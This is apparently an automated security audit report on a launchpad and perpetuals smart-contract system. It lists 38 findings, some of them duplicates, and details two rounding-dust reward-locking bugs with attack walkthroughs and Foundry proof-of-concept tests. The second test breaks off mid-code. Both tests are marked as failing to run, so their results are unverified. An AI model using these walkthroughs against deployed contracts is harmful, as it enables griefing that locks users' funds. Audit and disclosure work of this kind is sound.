# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

##Findings by Pattern
Low 3X/Low/gpt-5.1


 **Derived From** : Rounding in RewardsTracker desynchronizes totalPendingRewards and locks excess rewards

[L-1]. Rounding dust in RewardsTracker makes part of totalPendingRewards permanently unclaimable and unskimmable
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
[M-2]. Rounding dust in RewardsTracker causes totalPendingRewards to exceed sum of claimable rewards, permanently locking excess tokens and disabling skim
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Launchpad fee share on swaps manipulable via same-tx liquidity changes

[M-3]. Launchpad fee share in GTELaunchpadV2Pair can be flash-manipulated via intra-tx LP mint/burn to reduce rewards
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
[M-4]. Launchpad’s fee share per swap can be reduced arbitrarily via same-tx LP mint/burn manipulation
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
[M-5]. Launchpad fee share in GTELaunchpadV2Pair.swap manipulable via flash-mint/burn of LP tokens
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Perps account operations iterate over unbounded asset lists, enabling gas-based DoS

[M-6]. Unbounded loops over per-account assets in ClearingHouse make undercollateralized accounts practically unliquidatable
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless
[M-7]. Unbounded iteration over perps positions in ClearingHouseLib can make undercollateralized accounts unliquidatable
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The impact hinges on how many cross-margin markets are listed and practical gas limits on MegaETH. The code clearly lacks a per-account cap and loops linearly, but whether it reaches block gas limits is environment-dependent. Hence, while the root cause is real, exploit practicality could vary.
Finding Complexity: 4
Privilege: Permissionless
[M-8]. Unbounded per-account asset loops in ClearingHouseLib allow a user to make their account practically unliquidatable
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The attack path is clear from code, but the exact gas breakpoints depend on deployment parameters (number of markets, lot sizes, L2 gas limits) and LiquidatorPanel’s exact flow (not fully included). While the DoS risk is credible, the extent (OOG vs merely expensive) is environment-dependent.
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Perps mark price & funding TWAP can be pinned via low-liquidity orderbook impact price

[M-9]. Low-liquidity impact price TWAP lets attacker pin mark and funding using tiny self-placed orders
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: There is a known-issues note about TWAP manipulability, but this report additionally relies on the impactPrice fallback asymmetry and count-based EMA with zero timestamps for basis spread, which together enable the pinning even if TWAP were made stricter. Given that overlap is possible, confidence is marked somewhat rather than full.
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Reward debt uint96 truncation can break rewards accounting and lock claims

[L-10]. Unsafe uint96 rewardDebt truncation in RewardsTracker can overflow and DoS reward claiming for large pools
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The core overflow/truncation behavior and revert path are clear. The practical likelihood hinges on whether cumulative rewards can realistically exceed the uint96 bound for in-scope tokens; without explicit supply/amount caps in contest docs, this remains somewhat uncertain.
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : addRewards allows mismatched quote token, desyncing accounting and bricking reward claims

[M-11]. Mismatched quote token in Distributor.addRewards bricks rewards pool and permanently locks added rewards
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Mark price / funding oracle derived directly from manipulable CLOB state

[M-12]. Orderbook-derived mark price and funding oracles lack liquidity floors, enabling low-cost manipulation in thin markets
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : for each reward pool: totalAccRewards(self.totalShares, self.accBaseRewardPerShare) <= type(uint96).max && totalAccRewards(self.totalShares, self.accQuoteRewardPerShare) <= type(uint96).max

[L-13]. RewardsTrackerLib downcasts 256‑bit cumulative rewards into uint96, allowing overflow that can permanently brick rewards distribution
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless
[L-14]. RewardsTrackerLib silently truncates 256-bit cumulative rewards into uint96 debts, causing mis-accounting and potential reward-claim reverts at extreme magnitudes
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Balance Invariant: Distributor.increaseStake/decreaseStake/claimRewards (via _distributeAssets)

[H-15]. Staking rewards from bonding curve are misdirected to Launchpad instead of users when shares change
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Reward accounting can overflow uint96 rewardDebt, breaking per-user rewards invariants

[M-16]. RewardsTracker uses uint96 rewardDebt causing overflow/truncation and theft or permanent loss of rewards
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The vulnerability is clear and reproducible from code inspection, but the practical threshold to trigger truncation depends on cumulative rewards magnitude and token supply/usage patterns. For some assets (e.g., USDC) reaching 2^96 token units is unlikely, while for high-supply base tokens or via large donations it is plausible. Given these assumptions on volumes/supplies, confidence is somewhat short of absolute.
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : AccountingInvariantViolation

[M-17]. LaunchToken bonding share burn after unlock never ends rewards, leaving AMM pair in a permanent DoS state
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Unchecked downcasts in RewardsTracker can overflow user reward debt and break rewards accounting

[L-18]. uint256→uint96 rewardDebt truncation in RewardsTrackerLib can break reward accounting and DoS claims
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The truncation bug is clear from code inspection, but the practical reachability depends on long-term tokenomics (total shares, fee volumes, lifetime). Without exact supply/volume limits for the launch tokens and quote assets, it’s difficult to assert absolute unreachability, so confidence is moderated.
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Launchpad fee distribution relies on external Distributor that can brick swaps

[M-19]. Distributor.addRewards revert when totalShares == 0 causes permanent DoS of GTELaunchpadV2Pair swaps
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless
[L-20]. External Distributor callback in _distributeLaunchpadFees can DoS swaps and liquidity ops if misconfigured
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: RequiresAdminRole
[M-21]. Unisolated call to Distributor.addRewards in GTELaunchpadV2Pair._update can DoS swaps and liquidity ops
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Intended operational flow likely ends rewards promptly at graduation, which reduces likelihood. However, the absence of error isolation means any reverting condition in the Distributor (including configuration drift or transient zero-shares) can still DoS the pair. Given these operational assumptions, SomeWhatConfident is appropriate.
Finding Complexity: 4
Privilege: RequiresAdminRole
[L-22]. External Distributor.addRewards callback in _distributeLaunchpadFees can DoS swaps if misconfigured
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: RequiresAdminRole



 **Derived From** : Perps margin and price math assume 18‑decimals while USDC collateral may be 6‑decimals

[H-23]. USDC collateral treated as 18 decimals causes 1e12 under/overestimation of margin and liquidation thresholds
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
[H-24]. 1e18 notional vs 1e6 USDC margin comparison lets users open positions with far less real collateral than required
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless
[M-25]. Perp margin math assumes 1e18 quote while CollateralManager stores raw USDC (likely 1e6), enabling undercollateralized positions
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Rounding in RewardsTracker makes rewards dust unclaimable and locks skimExcessRewards

[L-26]. Rounding in RewardsTracker breaks totalPendingRewards invariant and can permanently lock excess rewards from being skimmed
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Funding and mark components use TWAP without staleness/age bounds

[L-27]. Funding settlement uses potentially unboundedly stale mark and index TWAPs without heartbeat checks
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: RequiresRole



 **Derived From** : StateMachine Invariant: Launchpad._graduate / buy / LaunchToken._beforeTokenTransfer

[L-28]. Bonding-share accounting continues to mutate after token graduation, violating expected lifecycle
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Asymmetric impact price fallback math can severely distort mark price and liquidations

[M-29]. Asymmetric fallback in MarketLib.getImpactPrice lets thin books push mark price to extreme, wrong-liquidating users
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: While the faulty math is indisputable, the worst-case liquidation impact depends on interaction with the median-of-three design and basis EMA behavior in thin books. In many cases the median will clamp out p3 extremes, limiting direct impact. Nonetheless, correctness is compromised and realistic adverse scenarios exist in illiquid markets.
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Untrusted Distributor callback can DoS AMM swaps when rewards shares go to zero

[L-30]. GTELaunchpadV2Pair swaps can be DoS'ed when rewards pool has zero shares but rewardsPoolActive is still set
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : BeaconOrFactoryAuthorityDrift

[M-31]. Permissionless GTELaunchpadV2PairFactory.createPair lets anyone permanently block launchpad‑enabled pair for a token pair
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : GriefableCallbacks

[L-32]. External Distributor callback inside _update can DoS swaps/mint/burn if it reverts
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Launchpad pair fee distribution can revert swaps when no stakers remain

[M-33]. GTELaunchpadV2Pair swap path hard-reverts via Distributor.addRewards when rewards active but totalShares == 0
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : StateMachine Invariant: Distributor / GTELaunchpadV2Pair / LaunchToken / Launchpad.RewardsTrackerLib.unstake / Distributor.decreaseStake / Distributor.endRewards / GTELaunchpadV2Pair.endRewardsAccrual / LaunchToken._decreaseFeeShares / Launchpad.endRewards

[M-34]. Launchpad AMM pool can be permanently bricked when last fee-share holder exits after graduation
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Invariant Type: StateMachine

[M-35]. Rewards pool can reach totalShares==0 post-unlock without disabling GTELaunchpadV2Pair accrual, bricking all future swaps
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : PermitMisuse

[L-36]. UniswapV2-style LP token permit lacks low-s and v validation, allowing signature malleability
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Launchpad fee distribution callback can brick AMM pair if Distributor reverts

[H-37]. External Distributor callback in _update can DoS swaps and LP operations if it reverts
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Distributor / GTELaunchpadV2Pair / LaunchToken / Launchpad.RewardsTrackerLib.unstake / Distributor.decreaseStake / Distributor.endRewards / GTELaunchpadV2Pair.endRewardsAccrual / LaunchToken._decreaseFeeShares / Launchpad.endRewards

[M-38]. Launch token AMM pair permanently DOSed when last fee-share holder exits, making all future swaps revert
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 4
- M: 21
- L: 13
- I: 0

##Findings by Pattern


 **Derived From** : Rounding in RewardsTracker desynchronizes totalPendingRewards and locks excess rewards

## [L-1]. Rounding dust in RewardsTracker makes part of totalPendingRewards permanently unclaimable and unskimmable

### Finding Severity Justification: Integer-division rounding in RewardsTracker causes a persistent drift between the book-kept totalPendingRewards and the actually claimable rewards. The remainder becomes permanently unclaimable by users and, due to the skim guard, also unrecoverable by admin. Impact is limited to rounding dust (or small tranches when totalShares is very large and updates occur before sufficient accumulation), so this does not put meaningful user capital at risk.
## Derived From Pattern/Invariant
Rounding in RewardsTracker desynchronizes totalPendingRewards and locks excess rewards

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.skimExcessRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
RewardsTrackerLib converts pendingBaseRewards/pendingQuoteRewards into per-share indices using integer division. Any remainder from this division is discarded when pending*Rewards is reset to zero in update(). Distributor.totalPendingRewards, however, is incremented by the *full* amount of rewards passed into addRewards and only decremented when user payouts occur. This creates a structural drift: a portion of totalPendingRewards can never be allocated to users nor recovered by admin via skimExcessRewards, because it is lost as rounding dust in the index math but still counted as pending.

Core logic (RewardsTrackerLib):

```solidity
uint128 public constant PRECISION_FACTOR = 1e12;

function getAccRewardsPerShare(RewardPoolData storage self)
    internal
    view
    returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
{
    uint96 totalShares = self.totalShares;
    if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

    accBaseRewardsPerShare = self.accBaseRewardPerShare;
    accQuoteRewardsPerShare = self.accQuoteRewardPerShare;

    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
    }

    if (self.pendingQuoteRewards > 0) {
        accQuoteRewardsPerShare += ((self.pendingQuoteRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
}

function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards; // full amount dropped, including division remainder
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}
```

In Distributor.addRewards:

```solidity
if (launchAssetAmount > 0) {
    rs.addBaseRewards(launchAsset, launchAssetAmount);
    _increaseTotalPending(launchAsset, launchAssetAmount);
    launchAsset.safeTransferFrom(...);
}

if (quoteAssetAmount > 0) {
    rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
    _increaseTotalPending(quoteAsset, quoteAssetAmount);
    quoteAsset.safeTransferFrom(...);
}

function _increaseTotalPending(address asset, uint256 amount) internal {
    unchecked { totalPendingRewards[asset] += amount; }
}
```

Because of the two-stage integer division (in getAccRewardsPerShare and totalAccRewards), the sum of all user payouts corresponding to a particular tranche of pending rewards can be strictly less than the amount passed to addRewards. The remainder is discarded when pending*Rewards is cleared, but totalPendingRewards was permanently increased by the full tranche amount. Over the pool lifetime, this leaves a residual totalPendingRewards[asset] that no user can ever claim.

When all stakers have exited (totalShares == 0 for the pool), getPendingRewards for any account returns zero, but totalPendingRewards[asset] can still be positive and the Distributor’s token balance holds the corresponding dust. Admin cannot reclaim these tokens via skimExcessRewards either:

```solidity
function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
    asset.safeTransfer(msg.sender, amount);
}
```

Here `asset.balanceOf(this)` equals `totalPendingRewards[asset]` (no one can claim the dust), so `balanceOf - totalPendingRewards == 0` and any nonzero `amount` reverts as SkimOverflow. Thus the rounding dust is permanently stuck in the contract.

## Impact
Because accRewardsPerShare is computed via two integer divisions, whenever pendingReward * PRECISION_FACTOR < totalShares (or, more generally, when totalShares does not divide PRECISION_FACTOR well), a tranche can contribute 0 to accRewardsPerShare even though totalPendingRewards was increased by the full tranche. Over time, multiple small top-ups can result in a non-trivial amount of rewards becoming unclaimable by users. This excess cannot be reclaimed by admin either due to the skim guard that enforces balanceOf(this) - totalPendingRewards >= amount, leaving tokens permanently locked. The magnitude can be up to the sum of such small tranches (not just fractional dust) until sufficient accumulation occurs to cross the distribution threshold.

## Command to Run Test


## Proof of Concept
Setup: a rewards pool with a very small totalShares that does not divide the PRECISION_FACTOR (1e12). Add small reward amounts such that (pending * PRECISION_FACTOR) / totalShares results in an acc increase that, when multiplied back by totalShares and divided by PRECISION_FACTOR, yields less than the added tokens. The remainder is dropped by update(), but totalPendingRewards is not reduced, causing a drift that cannot be skimmed.

Example walkthrough:
1) Initialize Distributor and create a rewards pair (launchAsset, quoteAsset). Stake 3 shares to a single user so rs.totalShares = 3.
2) Add 100 wei of quote rewards once (or add 1 wei 100 times without calling update between adds). totalPendingRewards[quote] increases by 100 and tokens are transferred to Distributor.
3) The user calls claimRewards(launchAsset). In update(), accQuoteRewardPerShare increase is q = floor(100 * 1e12 / 3). The total distributed across all shares is floor((q * 3) / 1e12) = 99, not 100. The user receives 99 wei; 1 wei is effectively lost from the reward accounting and remains in the Distributor contract.
4) After claim: quote.balanceOf(Distributor) = 1; totalPendingRewards[quote] = 1. No user has further pending rewards.
5) Admin tries to skimExcessRewards(quote, 1) and hits SkimOverflow, because balanceOf(this) - totalPendingRewards[quote] == 0. The 1 wei is permanently stuck.

Note: If instead you claim after every 1-wei add with totalShares=3, each update allocates 0 to users and deletes pending, turning every tranche into locked dust while totalPendingRewards increases by 1 each time.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock is Test {
    string public name = "Mock";
    string public symbol = "M";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function mint(address to, uint256 value) external {
        balanceOf[to] += value;
        totalSupply += value;
        emit Transfer(address(0), to, value);
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "bal");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(balanceOf[from] >= value, "bal");
        require(allowance[from][msg.sender] >= value, "allow");
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract RoundingDustLockTest is Test {
    Distributor dist;
    ERC20Mock launch;
    ERC20Mock quote;

    address launchpad;
    address user = address(0xBEEF);

    function setUp() public {
        dist = new Distributor();
        launchpad = address(this);
        dist.initialize(launchpad);

        launch = new ERC20Mock();
        quote = new ERC20Mock();

        // Create rewards pair via launchpad
        dist.createRewardsPair(address(launch), address(quote));

        // Stake a very small totalShares that does not divide PRECISION (1e12)
        // Only launchpad can call increaseStake
        dist.increaseStake(address(launch), user, 3); // totalShares = 3
    }

    function testRoundingDustLocksAndCannotBeSkimmed() public {
        // Add a small amount of quote rewards
        uint128 reward = 100; // 100 wei
        quote.mint(address(this), reward);
        quote.approve(address(dist), reward);
        dist.addRewards(address(launch), address(quote), 0, reward);

        // User claims all possible rewards
        vm.prank(user);
        (uint256 baseAmt, uint256 quoteAmt) = dist.claimRewards(address(launch));
        assertEq(baseAmt, 0, "no base reward in this test");
        assertEq(quoteAmt, 99, "user only receives 99 due to rounding loss");

        // 1 wei remains locked in Distributor and marked as pending
        uint256 bal = quote.balanceOf(address(dist));
        uint256 pending = dist.totalPendingRewards(address(quote));
        assertEq(bal, 1, "1 wei remains in distributor");
        assertEq(pending, 1, "1 wei tracked as totalPendingRewards");

        // Admin cannot skim the leftover due to guard
        vm.expectRevert(abi.encodeWithSignature("SkimOverflow()"));
        dist.skimExcessRewards(address(quote), 1);
    }
}


## Suggested Mitigation
Make totalPendingRewards reflect only distributable amounts and carry forward remainders, or add a safe reconciliation path:

- Track and retain remainder on update():
  When applying pending*Rewards, compute:
    accIncrease = (pending * PRECISION_FACTOR) / totalShares;
    distributed = (accIncrease * totalShares) / PRECISION_FACTOR; // in token units
    remainder = pending - distributed;
  Then set:
    self.acc*RewardPerShare += accIncrease;
    self.pending*Rewards = remainder; // carry forward leftover to next update so it can eventually be distributed
  This preserves value and prevents drift between token balance and totalPendingRewards.

- Additionally or alternatively, provide a controlled reconciliation function:
  When all pools for an asset have totalShares == 0 and no user has pending rewards, allow admin to set totalPendingRewards[asset] to 0 and then skim the entire balance. E.g. add reconcileDust(asset) onlyOwnerOrRoles(ADMIN_ROLE) with checks that all relevant RewardPoolData.totalShares == 0.

Either approach restores the invariant that totalPendingRewards matches truly claimable rewards (plus explicitly sweepable dust), eliminating permanently locked balances.


## [M-2]. Rounding dust in RewardsTracker causes totalPendingRewards to exceed sum of claimable rewards, permanently locking excess tokens and disabling skim

### Finding Severity Justification: Rewards distribution uses integer division with PRECISION=1e12 and deletes pending rewards on every update(), causing real, matured rewards to be dropped whenever pending*PRECISION/totalShares == 0. Those tokens remain in the contract but are unclaimable, while totalPendingRewards is incremented by the full added amount and only decremented on actual payouts. This desynchronization permanently locks tokens and disables skimExcessRewards for that asset. Impact is loss of distributable rewards and inability for admin to recover dust; no direct theft, hence Medium rather than High.
## Derived From Pattern/Invariant
Rounding in RewardsTracker desynchronizes totalPendingRewards and locks excess rewards

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards / skimExcessRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
`Distributor.totalPendingRewards[asset]` is designed to track the total amount of rewards owed to users. It is incremented in `addRewards` and decremented in `_distributeAssets` when users are paid. However, the underlying per-share reward accounting in `RewardsTrackerLib` uses integer division in a way that drops small amounts (dust) from `pending*Rewards` but never adjusts `totalPendingRewards` for this loss.

Key fragments:
```solidity
// Distributor.sol
mapping(address => uint256) public totalPendingRewards;

function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    ...
    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }

    if (quoteAssetAmount > 0) {
        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
        _increaseTotalPending(quoteAsset, quoteAssetAmount);
        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
    }
}

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}

function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
    asset.safeTransfer(msg.sender, amount);
}
```
The reward-index update logic:
```solidity
uint128 public constant PRECISION_FACTOR = 1e12;

function getAccRewardsPerShare(RewardPoolData storage self)
    internal view
    returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
{
    uint96 totalShares = self.totalShares;
    if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

    accBaseRewardsPerShare = self.accBaseRewardPerShare;
    accQuoteRewardsPerShare = self.accQuoteRewardPerShare;

    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
    }

    if (self.pendingQuoteRewards > 0) {
        accQuoteRewardsPerShare += ((self.pendingQuoteRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
}

function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards;  // NOTE: full amount deleted
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}

function totalAccRewards(uint256 shares, uint256 accRewardsPerShare) internal pure returns (uint256) {
    return (shares * accRewardsPerShare) / PRECISION_FACTOR;
}
```
For each rewards tranche added via `addRewards`:
* `pending*Rewards` is multiplied by `PRECISION_FACTOR` and divided by `totalShares` to update the per-share index.
* Any remainder in the division is **discarded** (integer division), but `pending*Rewards` is then set to zero.

Thus, the sum of all `baseAmount`/`quoteAmount` that users can ever claim from that tranche is strictly **less** than the raw `amount0/amount1` passed in, by a dust amount `dust_tranche` due to rounding.

Nevertheless, `Distributor._increaseTotalPending` increments `totalPendingRewards[asset]` by the full `amount`. Since `_decreaseTotalPending` is only ever called with actual payout amounts, the accumulated dust is never subtracted. Over time, across many `addRewards` calls, the following happens for each reward token `asset`:

* `totalPendingRewards[asset] = Σ(amount_tranche)` (minus actual payouts),
* `Σ(max_claimable_from_each_tranche)` is smaller by `Σ(dust_tranche)`.

When all users eventually withdraw/unstake and there are no more `shares`, all claimable rewards can be claimed, but `totalPendingRewards[asset]` will still be positive, equal to the sum of all dust remainders. This leftover balance is **unclaimable by any user**, yet `skimExcessRewards` still treats it as "pending" and refuses to let the admin withdraw it, because `asset.balanceOf(this) - totalPendingRewards[asset]` is zero.

A malicious user can exacerbate this drift by repeatedly calling `addRewards` with tiny `amount` relative to `totalShares` (e.g., 1 wei), ensuring each call produces 0 increment in `acc*RewardPerShare` while fully consuming `pending*Rewards`. This allows `totalPendingRewards[asset]` to grow arbitrarily while adding effectively no claimable rewards, eventually rendering all of those tokens permanently stuck and disabling `skimExcessRewards` for that token.

## Impact
Due to integer division when updating acc*RewardPerShare, a remainder of each pending tranche can be dropped while pending*Rewards is zeroed. Distributor.totalPendingRewards is still increased by the full added amount and only decreased on actual payouts, causing it to drift above the sum of mathematically claimable rewards. An attacker who is also a staker (or any staker during normal operations) can repeatedly add tiny rewards such that amount * PRECISION_FACTOR / totalShares == 0, then trigger update() via claim to permanently convert those deposits into unclaimable dust while inflating totalPendingRewards. Over time this locks tokens in the contract and prevents admin from skimming, since balance - totalPendingRewards remains zero. No direct theft occurs; the impact is permanent loss of distributable rewards for users and denial of skim for the admin.

## Command to Run Test


## Proof of Concept
Preconditions: a rewards pool (launchAsset, quoteAsset) exists and at least one user has shares. PRECISION_FACTOR = 1e12.

Steps:
1) Ensure totalShares > PRECISION_FACTOR (e.g., totalShares = 1e13) so that for a 1-wei tranche we have (1 * PRECISION_FACTOR) / totalShares == 0.
2) The attacker is also a staker (has non-zero shares). Repeatedly:
   - Call addRewards(launchAsset, quoteAsset, 0, 1) transferring 1 wei of quoteAsset to Distributor.
   - Immediately call claimRewards(launchAsset) as the staker to force RewardsTrackerLib.update().
3) Each iteration, update() computes accQuoteRewardPerShare += 0 and then deletes pendingQuoteRewards, effectively discarding that 1 wei from the per-share accounting. No rewards are paid out, so users' pending remains unchanged.
4) Distributor.totalPendingRewards[quoteAsset] increases by 1 for each addRewards call (it is only decreased on actual payouts), while the contract balance of quoteAsset increases by the same amount. Users can never claim these units (getPendingRewards returns unchanged values).
5) After many iterations, totalPendingRewards[quoteAsset] equals the contract’s entire quoteAsset balance, so asset.balanceOf(this) - totalPendingRewards[quoteAsset] == 0, and any call to skimExcessRewards(quoteAsset, >0) reverts with SkimOverflow().

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function totalSupply() external view returns (uint256) { return 0; }
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); return true;
    }
    function transfer(address to, uint256 value) external returns (bool) { _transfer(msg.sender, to, value); return true; }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 a = allowance[from][msg.sender]; require(a >= value, "allowance"); allowance[from][msg.sender] = a - value; _transfer(from, to, value); return true;
    }
    function _transfer(address from, address to, uint256 value) internal {
        balanceOf[from] -= value; balanceOf[to] += value; emit Transfer(from, to, value);
    }
    function mint(address to, uint256 value) external { balanceOf[to] += value; emit Transfer(address(0), to, value); }
}

contract RewardsRoundingDustTest is Test {
    Distributor distributor;
    address launchpad = address(0xBEEF);
    address staker = address(0xB0B);

    ERC20Mock L; // launch asset (unused token for base side)
    ERC20Mock Q; // quote asset (the reward token we add)

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);
        L = new ERC20Mock("L","L");
        Q = new ERC20Mock("Q","Q");

        // Create rewards pair via launchpad
        vm.prank(launchpad);
        distributor.createRewardsPair(address(L), address(Q));

        // Give staker large shares so tiny rewards round to zero per-share
        // PRECISION = 1e12, so pick totalShares > 1e12
        uint96 S = 10_000_000_000_000; // 1e13
        vm.prank(launchpad);
        distributor.increaseStake(address(L), staker, S);

        // Fund staker with Q and approve distributor
